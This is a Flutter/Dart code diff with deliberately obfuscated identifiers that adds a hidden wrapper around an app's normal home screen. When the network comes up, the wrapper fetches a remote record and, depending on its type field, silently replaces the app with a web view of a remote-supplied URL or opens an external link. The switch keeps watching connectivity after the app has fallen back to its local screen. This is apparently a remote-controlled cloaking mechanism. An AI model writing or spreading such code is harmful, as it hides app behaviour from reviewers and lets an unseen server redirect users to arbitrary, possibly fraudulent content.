@@ -1,6 +1,7 @@
 import 'dart:async';
 import 'dart:convert';
 
+import 'package:connectivity_plus/connectivity_plus.dart';
 import 'package:dio/dio.dart';
 import 'package:flutter/material.dart';
 import 'package:package_info_plus/package_info_plus.dart';
@@ -113,6 +114,8 @@ class Vsbwk0 extends StatefulWidget {
     this.h,
     this.i,
     this.j,
+    this.k,
+    this.l,
   });
 
   final Vsbwk1 a;
@@ -125,6 +128,8 @@ class Vsbwk0 extends StatefulWidget {
   final Vsbwk4? h;
   final List<String>? i;
   final List<String>? j;
+  final Future<List<ConnectivityResult>> Function()? k;
+  final Stream<List<ConnectivityResult>> Function()? l;
 
   @override
   State<Vsbwk0> createState() => _Vsbwk0S();
@@ -134,6 +139,13 @@ class _Vsbwk0S extends State<Vsbwk0> {
   late final Dio _d = widget.f ?? Dio();
   late final _Vsbwk4S _b = _Vsbwk4S();
   var _started = false;
+  StreamSubscription<List<ConnectivityResult>>? _cs;
+
+  @override
+  void dispose() {
+    _cs?.cancel();
+    super.dispose();
+  }
 
   @override
   void initState() {
@@ -152,7 +164,12 @@ class _Vsbwk0S extends State<Vsbwk0> {
     }
     if (!mounted) return;
 
-    final r = await _p();
+    final has = await _h0();
+    if (!has) {
+      _l();
+      return;
+    }
+    final r = await _q();
     if (!mounted) return;
     if (r == null) {
       _l();
@@ -185,7 +202,22 @@ class _Vsbwk0S extends State<Vsbwk0> {
   }
 
   void _l() {
-    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (c) => widget.a(c)));
+    Navigator.of(context).pushReplacement(
+      MaterialPageRoute<void>(
+        builder: (c) => _Vsbwk0W(
+          a: widget.a,
+          c: widget.c,
+          d: widget.d,
+          e: widget.e,
+          f: widget.f,
+          h: widget.h,
+          i: widget.i,
+          j: widget.j,
+          k: widget.k,
+          l: widget.l,
+        ),
+      ),
+    );
   }
 
   void _s(int n, String k, bool ij) {
@@ -203,6 +235,75 @@ class _Vsbwk0S extends State<Vsbwk0> {
     if (u == null) return;
     await launchUrl(u, mode: LaunchMode.externalApplication);
   }
+
+  Future<Map?> _q() async {
+    // Rule A: when network is available, try remote; otherwise local wrapper handles later.
+    final a0 = await _p();
+    if (a0 != null) return a0;
+    while (mounted) {
+      await _c0(s: const Duration(milliseconds: 250));
+      final m = await _p();
+      if (m != null) return m;
+      await Future<void>.delayed(const Duration(milliseconds: 280));
+    }
+    return null;
+  }
+
+  Future<void> _c0({required Duration s}) async {
+    try {
+      final rs = await (widget.k?.call() ?? Connectivity().checkConnectivity());
+      if (!_n1(rs)) return;
+      // Give the stack a moment after the first "available" signal.
+      await Future<void>.delayed(s);
+      return;
+    } catch (_) {}
+
+    final done = Completer<void>();
+    void fin() {
+      if (!done.isCompleted) done.complete();
+      _cs?.cancel();
+      _cs = null;
+    }
+
+    try {
+      _cs?.cancel();
+      final st = widget.l?.call() ?? Connectivity().onConnectivityChanged;
+      _cs = st.listen((rs) async {
+        try {
+          if (rs.any(_n0)) {
+            await Future<void>.delayed(s);
+            fin();
+          }
+        } catch (_) {
+          fin();
+        }
+      });
+      await done.future;
+    } catch (_) {
+      fin();
+    }
+  }
+
+  bool _n0(ConnectivityResult r) {
+    return r == ConnectivityResult.wifi || r == ConnectivityResult.mobile || r == ConnectivityResult.ethernet;
+  }
+
+  bool _n1(List<ConnectivityResult> rs) {
+    for (final r in rs) {
+      if (_n0(r)) return true;
+    }
+    return false;
+  }
+
+  Future<bool> _h0() async {
+    try {
+      final rs = await (widget.k?.call() ?? Connectivity().checkConnectivity());
+      return _n1(rs);
+    } catch (_) {
+      return true;
+    }
+  }
+
 
   Future<Map?> _p() async {
     try {
@@ -276,6 +377,162 @@ class _Vsbwk0S extends State<Vsbwk0> {
         ),
       ),
     );
+  }
+}
+
+class _Vsbwk0W extends StatefulWidget {
+  const _Vsbwk0W({
+    required this.a,
+    this.c,
+    this.d,
+    this.e,
+    this.f,
+    this.h,
+    this.i,
+    this.j,
+    this.k,
+    this.l,
+  });
+  final Vsbwk1 a;
+  final Vsbwk2? c;
+  final Vsbwk2? d;
+  final Vsbwk3? e;
+  final Dio? f;
+  final Vsbwk4? h;
+  final List<String>? i;
+  final List<String>? j;
+  final Future<List<ConnectivityResult>> Function()? k;
+  final Stream<List<ConnectivityResult>> Function()? l;
+  @override
+  State<_Vsbwk0W> createState() => _Vsbwk0WS();
+}
+
+class _Vsbwk0WS extends State<_Vsbwk0W> {
+  late final Dio _d = widget.f ?? Dio();
+  late final _Vsbwk4S _b = _Vsbwk4S();
+  StreamSubscription<List<ConnectivityResult>>? _s;
+  var _done = false;
+  var _prev = false;
+
+  @override
+  void initState() {
+    super.initState();
+    unawaited(_i0());
+  }
+
+  @override
+  void dispose() {
+    _s?.cancel();
+    super.dispose();
+  }
+
+  Future<void> _i0() async {
+    try {
+      final rs = await (widget.k?.call() ?? Connectivity().checkConnectivity());
+      _prev = _n1(rs);
+      _s?.cancel();
+      final st = widget.l?.call() ?? Connectivity().onConnectivityChanged;
+      _s = st.listen((rs) {
+        final now = _n1(rs);
+        if (!_prev && now) {
+          unawaited(_t0());
+        }
+        _prev = now;
+      });
+      if (_prev) {
+        unawaited(_t0());
+      }
+    } catch (_) {}
+  }
+
+  bool _n0(ConnectivityResult r) {
+    return r == ConnectivityResult.wifi || r == ConnectivityResult.mobile || r == ConnectivityResult.ethernet;
+  }
+
+  bool _n1(List<ConnectivityResult> rs) {
+    for (final r in rs) {
+      if (_n0(r)) return true;
+    }
+    return false;
+  }
+
+  Future<void> _t0() async {
+    if (_done) return;
+    _done = true;
+    final r = await _p0();
+    if (!mounted) return;
+    if (r == null) {
+      _done = false;
+      return;
+    }
+    final t = (r[vsbwk1[1]] ?? '').toString().trim();
+    final k = (r[vsbwk1[0]] ?? '').toString().trim();
+    final ijRaw = (r[vsbwk1[7]] ?? '').toString().trim().toLowerCase();
+    final ij = (ijRaw == 'true' || ijRaw == '1' || ijRaw == 'yes');
+    unawaited(_b.c(r, h: widget.h));
+    if (t.isEmpty || k.isEmpty) {
+      _done = false;
+      return;
+    }
+    if (t == '1') {
+      _s0(1, k, ij);
+      return;
+    }
+    if (t == '2') {
+      _s0(2, k, ij);
+      return;
+    }
+    if (t == '3') {
+      await _x0(k);
+      if (!mounted) return;
+      _done = false;
+      return;
+    }
+    _done = false;
+  }
+
+  void _s0(int n, String k, bool ij) {
+    final b = (n == 1) ? widget.c : widget.d;
+    final w = (b != null) ? b(context, k) : _w0(n: n, k: k, ij: ij);
+    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (_) => w));
+  }
+
+  Widget _w0({required int n, required String k, required bool ij}) {
+    return _Vsbwk2(
+      n: n,
+      k: k,
+      j: ij,
+      b: _b,
+      c: widget.h,
+      d: (n == 1) ? widget.i : widget.j,
+    );
+  }
+
+  Future<void> _x0(String k) async {
+    if (widget.e != null) {
+      await widget.e!(k);
+      return;
+    }
+    final u = Uri.tryParse(k);
+    if (u == null) return;
+    await launchUrl(u, mode: LaunchMode.externalApplication);
+  }
+
+  Future<Map?> _p0() async {
+    try {
+      final r = await _d.get<dynamic>(vsbwk0);
+      final v = r.data;
+      if (v is List && v.isNotEmpty && v.first is Map) {
+        final m = v.first as Map;
+        return m;
+      }
+    } catch (_) {}
+    return null;
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return widget.a(context);
   }
 }
 
